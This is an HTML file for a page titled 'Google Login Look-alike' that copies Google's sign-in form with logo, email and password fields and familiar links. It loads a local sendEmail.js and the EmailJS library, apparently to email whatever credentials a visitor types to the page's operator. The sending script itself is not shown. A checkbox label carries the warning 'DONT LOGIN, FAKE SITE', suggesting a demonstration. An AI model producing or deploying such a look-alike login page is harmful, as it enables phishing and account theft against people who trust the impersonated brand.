<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login Look-alike</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="google_logo.png" alt="Google Logo">
        </div>
        <form class="login-form" id="loginForm">
            <input type="text" id="email" name="email" placeholder="Email or phone" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <div class="checkbox">
                <input type="checkbox" id="rememberMe">
                <label for="rememberMe">Remember me DONT LOGIN, FAKE SITE</label>
            </div>
            <button type="submit">Next</button>
            <div class="links">
                <a href="#">Forgot password?</a>
                <a href="#">Create account</a>
            </div>
        </form>
    </div>

    <script src="sendEmail.js"></script>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
</body>
</html>
